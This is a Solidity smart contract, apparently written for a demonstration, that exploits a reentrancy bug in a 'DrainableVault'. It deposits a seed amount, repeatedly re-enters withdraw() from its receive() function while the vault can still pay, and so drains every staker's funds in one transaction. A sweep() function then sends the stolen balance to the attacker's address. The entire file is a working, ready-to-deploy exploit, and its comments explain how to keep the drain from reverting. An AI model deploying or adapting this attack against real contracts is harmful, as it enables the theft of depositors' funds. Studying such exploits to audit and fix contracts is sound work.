// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IDrainableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @notice Exploits DrainableVault's reentrancy. `attack()` deposits a seed chunk, then re-enters
/// `withdraw(chunk)` from receive() while the vault can still pay another chunk — draining the whole
/// pool (every staker's funds) in one transaction. The re-entry is BOUNDED (only while the vault
/// balance ≥ chunk) so no send ever fails — a failing send would `require`-revert the entire drain.
/// Anyone can deploy + run this against the vulnerable vault; that's the point.
contract ReentrancyAttacker {
    IDrainableVault public immutable vault;
    address public immutable owner;
    uint256 public chunk;

    constructor(address _vault) {
        vault = IDrainableVault(_vault);
        owner = msg.sender;
    }

    /// @notice Seed `msg.value` as the re-entry chunk, deposit it, then kick off the recursive drain.
    function attack() external payable {
        require(msg.value > 0, "no seed");
        chunk = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(chunk);
    }

    receive() external payable {
        // Re-enter only while the vault can still pay a full chunk → every send succeeds, nothing reverts.
        if (address(vault).balance >= chunk) {
            vault.withdraw(chunk);
        }
    }

    /// @notice Send the drained loot to `to` (the attacker EOA) — for the on-camera reveal.
    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
